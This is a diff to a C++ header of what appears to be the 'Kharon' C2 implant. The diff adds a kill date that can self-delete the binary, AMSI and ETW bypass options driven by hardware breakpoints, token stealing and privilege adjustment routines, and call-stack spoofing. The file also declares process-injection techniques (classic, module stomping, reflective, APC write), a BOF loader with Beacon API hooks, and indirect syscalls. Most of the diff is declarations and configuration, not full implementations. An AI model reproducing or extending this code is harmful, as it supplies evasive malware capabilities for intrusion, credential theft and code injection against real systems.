@@ -51,13 +51,26 @@ EXTERN_C UPTR EndPtr();
 #define KH_JITTER 0
 #endif // KH_JITTER
 
+#ifndef KH_BOF_HOOK_ENALED
+#define KH_BOF_HOOK_ENALED FALSE
+#endif // KH_BOF_HOOK_ENALED
+
+#ifndef KH_KILLDATE_ENABLED
+#define KH_KILLDATE_ENABLED FALSE
+#endif // KH_KILLDATE_ENABLED
+
 #ifndef KH_CALL_STACK_SPOOF
 #define KH_CALL_STACK_SPOOF FALSE
 #endif // KH_CALL_STACK_SPOOF
 
-#ifndef KH_HARDWARE_BREAKPOINT_ENABLED
-#define KH_HARDWARE_BREAKPOINT_ENABLED FALSE
-#endif // KH_HARDWARE_BREAKPOINT_ENABLED
+#define KH_BYPASS_NONE 0x000
+#define KH_BYPASS_ALL  0x100
+#define KH_BYPASS_ETW  0x400
+#define KH_BYPASS_AMSI 0x700
+
+#ifndef KH_HARDWARE_BREAKPOINT_BYPASS_DOTNET
+#define KH_HARDWARE_BREAKPOINT_BYPASS_DOTNET KH_BYPASS_NONE
+#endif // KH_HARDWARE_BREAKPOINT_BYPASS_DOTNET
 
 #ifndef KH_INDIRECT_SYSCALL_ENABLED
 #define KH_INDIRECT_SYSCALL_ENABLED FALSE
@@ -238,15 +251,31 @@ namespace Root {
             BOOL  Connected;
 
             struct {
+                BOOL Enabled;
+                BOOL SelfDelete; // if true, self delete the process binary of the disk (care should be taken within a grafted process to exclude an accidentally unintended binary.)
+                BOOL ExitProc;   // if true exit the process, else exit the thread
+
+                INT16 Day;
+                INT16 Month;
+                INT16 Year;
+            } KillDate;
+
+            struct {
                 UPTR Start;
                 UPTR Length;
             } Base;        
         } Session = {
-            .AgentID     = KH_AGENT_UUID,
-            .SleepTime   = KH_SLEEP_TIME * 1000,
-            .Jitter      = KH_JITTER,
-            .HeapHandle  = U_PTR( NtCurrentPeb()->ProcessHeap ),
-            .Connected   = FALSE
+            .AgentID    = KH_AGENT_UUID,
+            .SleepTime  = KH_SLEEP_TIME * 1000,
+            .Jitter     = KH_JITTER,
+            .HeapHandle = U_PTR( NtCurrentPeb()->ProcessHeap ),
+            .Connected  = FALSE,
+
+            .KillDate = {
+                .Enabled    = KH_KILLDATE_ENABLED,
+                .SelfDelete = FALSE,
+                .ExitProc   = TRUE
+            }
         };
 
         struct {
@@ -276,8 +305,10 @@ namespace Root {
             DECLAPI( GetProcAddress );
             DECLAPI( GetModuleHandleA );
             DECLAPI( EnumProcessModules );
-            DECLAPI( GetModuleFileNameExA );
+            DECLAPI( K32GetModuleFileNameExA );
             DECLAPI( GetModuleFileNameW );
+
+            DECLAPI( GetSystemTime );
 
             DECLAPI( CreateTimerQueueTimer );
 
@@ -367,8 +398,10 @@ namespace Root {
             RSL_TYPE( GetProcAddress ),
             RSL_TYPE( GetModuleHandleA ),
             RSL_TYPE( EnumProcessModules ),
-            RSL_TYPE( GetModuleFileNameExA ),
+            RSL_TYPE( K32GetModuleFileNameExA ),
             RSL_TYPE( GetModuleFileNameW ),
+
+            RSL_TYPE( GetSystemTime ),
 
             RSL_TYPE( CreateTimerQueueTimer ),
 
@@ -623,7 +656,11 @@ namespace Root {
             UPTR Handle;
             DECLAPI( LookupAccountSidW );
             DECLAPI( LookupAccountSidA );
-            DECLAPI( OpenProcessToken    );
+            DECLAPI( LookupPrivilegeValueA );
+            DECLAPI( LookupPrivilegeNameA );
+            DECLAPI( AdjustTokenPrivileges );
+            DECLAPI( OpenProcessToken );
+            DECLAPI( OpenThreadToken );
             DECLAPI( GetTokenInformation );
 
             DECLAPI( GetUserNameA );
@@ -634,7 +671,11 @@ namespace Root {
         } Advapi32 = {
             RSL_TYPE( LookupAccountSidW ),
             RSL_TYPE( LookupAccountSidA ),
+            RSL_TYPE( LookupPrivilegeValueA ),
+            RSL_TYPE( LookupPrivilegeNameA ),
+            RSL_TYPE( AdjustTokenPrivileges ),
             RSL_TYPE( OpenProcessToken ),
+            RSL_TYPE( OpenThreadToken ),
             RSL_TYPE( GetTokenInformation ),
 
             RSL_TYPE( GetUserNameA ),
@@ -740,12 +781,24 @@ typedef struct {
 	INT   size;     
 } FMTP, *PFMTP;
 
+class Spoof {
+private:
+    Root::Kharon* Self;    
+public:
+    Spoof( Root::Kharon* KharonRf ) : Self( KharonRf ) {}
+
+    BOOL Enabled = KH_CALL_STACK_SPOOF;
+};
+
 class Coff {
 private:
     Root::Kharon* Self;    
 public:
+    Coff( Root::Kharon* KharonRf ) : Self( KharonRf ) {}
 
     PPACKAGE Pkg = { 0 };
+
+    BOOL Hook = KH_BOF_HOOK_ENALED;
 
     struct {
         UPTR  SymHash;
@@ -772,8 +825,6 @@ public:
         ApiTable[18] = { Hsh::Str("BeaconOpenThread"),       reinterpret_cast<PVOID>(&Coff::OpenThread) },
         // ApiTable[19] = { Hsh::Str("BeaconGetSpawnTo"),       reinterpret_cast<PVOID>(&Coff::GetSpawn) },
     };
-    
-    Coff( Root::Kharon* KharonRf ) : Self( KharonRf ) {}
 
     inline auto RslRel(
         _In_ PVOID  Base,
@@ -786,9 +837,9 @@ public:
     ) -> PVOID;
 
     auto Loader(
-        _In_ PBYTE Buffer,
+        _In_ BYTE* Buffer,
         _In_ ULONG Size,
-        _In_ PBYTE Args,
+        _In_ BYTE* Args,
         _In_ ULONG Argc
     ) -> BOOL;
 
@@ -997,13 +1048,13 @@ private:
 public:
     HwbpEng( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
-    PDESCRIPTOR_HOOK  Threads = nullptr;
-    PRTL_CRITICAL_SECTION Crt= nullptr;
-    PCRITICAL_SECTION CritSec = nullptr;
+    DESCRIPTOR_HOOK*      Threads = nullptr;
+    RTL_CRITICAL_SECTION* Crt     = nullptr;
+    CRITICAL_SECTION*     CritSec = nullptr;
 
-    BOOL  Enabled     = KH_HARDWARE_BREAKPOINT_ENABLED;
-    BOOL  Initialized = FALSE;
-    PVOID Handler     = nullptr;
+    INT32 DotnetBypass = KH_HARDWARE_BREAKPOINT_BYPASS_DOTNET;
+    BOOL  Initialized  = FALSE;
+    PVOID Handler      = nullptr;
 
     struct {
         PVOID Parameter;
@@ -1228,7 +1279,7 @@ public:
     auto VersionList( VOID ) -> VOID;
 
     auto Inline(
-        _In_ PBYTE AsmBytes,
+        _In_ BYTE* AsmBytes,
         _In_ ULONG AsmLength,
         _In_ PWSTR Arguments,
         _In_ PWSTR AppDomName,
@@ -1244,15 +1295,19 @@ public:
     Useful( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
     auto Xor( 
-        _In_opt_ PBYTE  Bin, 
+        _In_opt_ BYTE*  Bin, 
         _In_     SIZE_T BinSize, 
-        _In_     PBYTE  Key, 
+        _In_     BYTE*  Key, 
         _In_     SIZE_T KeySize 
     ) -> VOID;
 
     auto NtStatusToError(
         _In_ NTSTATUS NtStatus
     ) -> ERROR_CODE;
+
+    auto SelfDelete( VOID ) -> BOOL;
+    
+    auto CheckKillDate( VOID ) -> VOID;
 
     auto FixRel(
         _In_ PVOID Base,
@@ -1404,7 +1459,7 @@ public:
     auto Pad(
         _In_  PPARSER parser,
         _Out_ ULONG size
-    ) -> PBYTE;
+    ) -> BYTE*;
 
     auto Byte(
         _In_ PPARSER Parser
@@ -1424,17 +1479,17 @@ public:
 
     auto Bytes(
         _In_  PPARSER parser,
-        _Out_ PULONG  size
-    ) -> PBYTE;
+        _Out_ ULONG*  size
+    ) -> BYTE*;
 
     auto Str( 
         _In_ PPARSER parser, 
-        _In_ PULONG  size 
+        _In_ ULONG*  size 
     ) -> PCHAR;
 
     auto Wstr(
         _In_ PPARSER parser, 
-        _In_ PULONG  size 
+        _In_ ULONG*  size 
     ) -> PWCHAR;
 
     auto Destroy(
@@ -1550,7 +1605,7 @@ public:
         VOID 
     ) -> VOID;
 
-    auto Injection(
+    auto Token(
         _In_ PJOBS Job
     ) -> ERROR_CODE;
 
@@ -1620,6 +1675,7 @@ public:
         Mgmt[9].ID = TskDotnet,     Mgmt[9].Run = &Task::Dotnet,
         Mgmt[10].ID = TskSocks,     Mgmt[10].Run = &Task::Socks,
         Mgmt[11].ID = TskExecPE,    Mgmt[11].Run = &Task::ExecPE,
+        Mgmt[12].ID = TskToken,     Mgmt[12].Run = &Task::Token
     };
 };
 
@@ -1637,7 +1693,7 @@ public:
     } Ctx = {
         .ParentID   = 0,
         .BlockDlls  = FALSE,
-        .CurrentDir = 0,
+        .CurrentDir = nullptr,
         .Pipe       = TRUE
     };
 
@@ -1666,7 +1722,7 @@ public:
         _In_  PVOID  Parameter,
         _In_  ULONG  StackSize,
         _In_  ULONG  Flags,
-        _Out_ PULONG ThreadID
+        _Out_ ULONG* ThreadID
     ) -> HANDLE;
 
     auto Open(
@@ -1724,22 +1780,50 @@ public:
     ) -> UPTR;
 };
 
+typedef struct _TOKEN_NODE {
+    ULONG  TokenID; // fiction number generated from agent
+    HANDLE Handle;
+    PCHAR  User;
+    ULONG  ProcessID;
+    ULONG  ThreadID;
+    PCHAR  Host;
+    struct _TOKEN_NODE* Next;
+} TOKEN_NODE; 
+
 class Token {
 private:
     Root::Kharon* Self;
 public:
     Token( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
-    auto GetUser( 
-        _Out_ PCHAR *UserNamePtr, 
-        _Out_ ULONG *UserNameLen, 
-        _In_  HANDLE TokenHandle 
+    TOKEN_NODE* Node = nullptr;
+
+    auto Current( VOID ) -> HANDLE;
+
+    auto TdOpen(
+        _In_  HANDLE  ThreadHandle,
+        _In_  ULONG   RightsAccess,
+        _In_  BOOL    OpenAsSelf,
+        _Out_ HANDLE* TokenHandle
     ) -> BOOL;
 
+    auto SetPriv(
+        _In_ HANDLE Handle,
+        _In_ CHAR*  PrivName
+    ) -> BOOL;
+
+    auto Steal(
+        _In_ ULONG ProcessID
+    ) -> HANDLE;
+
+    auto GetUser( 
+        _In_  HANDLE TokenHandle 
+    ) -> CHAR*;
+
     auto ProcOpen(
-        _In_ HANDLE  ProcessHandle,
-        _In_ ULONG   RightsAccess,
-        _In_ PHANDLE TokenHandle
+        _In_  HANDLE  ProcessHandle,
+        _In_  ULONG   RightsAccess,
+        _Out_ HANDLE* TokenHandle
     ) -> BOOL;
 };
 
@@ -1747,7 +1831,7 @@ typedef struct _HEAP_NODE {
     PVOID Block;
     ULONG Size;
     struct _HEAP_NODE* Next;
-} HEAP_NODE, *PHEAP_NODE;
+} HEAP_NODE;
 
 class Heap {
 private:
@@ -1755,7 +1839,7 @@ private:
 public:
     Heap( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
-    PHEAP_NODE Node = nullptr;
+    HEAP_NODE* Node = nullptr;
     ULONG Count     = 0;
 
     BYTE  Key[16]   = { 0 };
@@ -1796,29 +1880,29 @@ public:
         _In_  PVOID  Base,
         _In_  ULONG  Size,
         _In_  ULONG  NewProt,
-        _Out_ PULONG OldProt
+        _Out_ ULONG* OldProt
     ) -> BOOL;
 
     auto Write(
         _In_ HANDLE Handle,
         _In_ PVOID  Base,
-        _In_ PBYTE  Buffer,
+        _In_ BYTE*  Buffer,
         _In_ ULONG  Size
     ) -> BOOL;
 
     auto WriteAPC(
         _In_ HANDLE Handle,
         _In_ PVOID  Base,
-        _In_ PBYTE  Buffer,
+        _In_ BYTE*  Buffer,
         _In_ ULONG  Size
     ) -> BOOL;
 
     auto Read(
         _In_  HANDLE  Handle,
         _In_  PVOID   Base,
-        _In_  PBYTE   Buffer,
+        _In_  BYTE*   Buffer,
         _In_  SIZE_T  Size,
-        _Out_ PSIZE_T Reads
+        _Out_ SIZE_T* Reads
     ) -> BOOL;
 
     auto Free(
@@ -1831,21 +1915,21 @@ public:
     auto MapView(
         _In_        HANDLE          SectionHandle,
         _In_        HANDLE          ProcessHandle,
-        _Inout_     PVOID           *BaseAddress,
+        _Inout_     PVOID          *BaseAddress,
         _In_        ULONG_PTR       ZeroBits,
         _In_        SIZE_T          CommitSize,
-        _Inout_opt_ PLARGE_INTEGER  SectionOffset,
-        _Inout_     PSIZE_T         ViewSize,
+        _Inout_opt_ LARGE_INTEGER*  SectionOffset,
+        _Inout_     SIZE_T*         ViewSize,
         _In_        SECTION_INHERIT InheritDisposition,
         _In_        ULONG           AllocationType,
         _In_        ULONG           PageProtection
     ) -> LONG;
 
     auto CreateSection(
-        _Out_    PHANDLE            SectionHandle,
+        _Out_    HANDLE*            SectionHandle,
         _In_     ACCESS_MASK        DesiredAccess,
         _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
-        _In_opt_ PLARGE_INTEGER     MaximumSize,
+        _In_opt_ LARGE_INTEGER*     MaximumSize,
         _In_     ULONG              SectionPageProtection,
         _In_     ULONG              AllocationAttributes,
         _In_opt_ HANDLE             FileHandle
@@ -1930,10 +2014,10 @@ public:
 
         struct {
             ULONG s;
-            PBYTE p;
+            BYTE* p;
         } Param;
         
-        BOOL  Spawn;
+        BOOL Spawn;
 
     } Ctx = {
         .PE = { .TechniqueID = KH_INJECTION_PE },
@@ -1942,14 +2026,14 @@ public:
 
     auto Shellcode(
         _In_ ULONG ProcessID,
-        _In_ PBYTE Buffer,
+        _In_ BYTE* Buffer,
         _In_ UPTR  Size,
         _In_ PVOID Param
     ) -> BOOL;
 
     auto Classic(
         _In_  ULONG   ProcessID,
-        _In_  PBYTE   Buffer,
+        _In_  BYTE*   Buffer,
         _In_  UPTR    Size,
         _In_  PVOID   Param,
         _Out_ PVOID*  Base
@@ -1957,14 +2041,14 @@ public:
 
     auto Stomp(
         _In_  ULONG   ProcessID,
-        _In_  PBYTE   Buffer,
+        _In_  BYTE*   Buffer,
         _In_  UPTR    Size,
         _In_  PVOID   Param,
         _Out_ PVOID*  Base
     ) -> BOOL;
 
     auto Reflection(
-        _In_ PBYTE  Buffer,
+        _In_ BYTE*  Buffer,
         _In_ ULONG  Size,
         _In_ PVOID  Param
     ) -> BOOL;
